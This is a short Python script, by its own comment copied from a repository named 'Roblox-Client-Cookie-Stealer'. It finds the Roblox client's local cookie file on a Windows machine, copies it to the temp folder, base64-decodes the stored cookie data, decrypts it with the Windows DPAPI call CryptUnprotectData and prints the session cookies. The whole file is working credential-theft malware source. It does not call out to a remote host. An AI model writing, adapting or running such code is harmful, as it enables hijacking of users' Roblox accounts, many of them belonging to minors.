# Completely skidded from:
# https://github.com/Ramona-Flower/Roblox-Client-Cookie-Stealer/tree/main

import os
import shutil
import json
import base64
import win32crypt

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        return
    
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)
            
            encoded_cookies = file_content.get("CookiesData", "")
            
            if encoded_cookies:
                decoded_cookies = base64.b64decode(encoded_cookies)
                
                try:
                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                    print("Decrypted Content:")
                    print(decrypted_cookies.decode('utf-8', errors='ignore'))
                except Exception as e:
                    print(f"Error decrypting with DPAPI: {e}")
            else:
                print("Error: No 'CookiesData' found in the file.")
        
        except json.JSONDecodeError as e:
            print(f"Error while parsing JSON: {e}")
        except Exception as e:
            print(f"Error: {e}")

retrieve_roblox_cookies()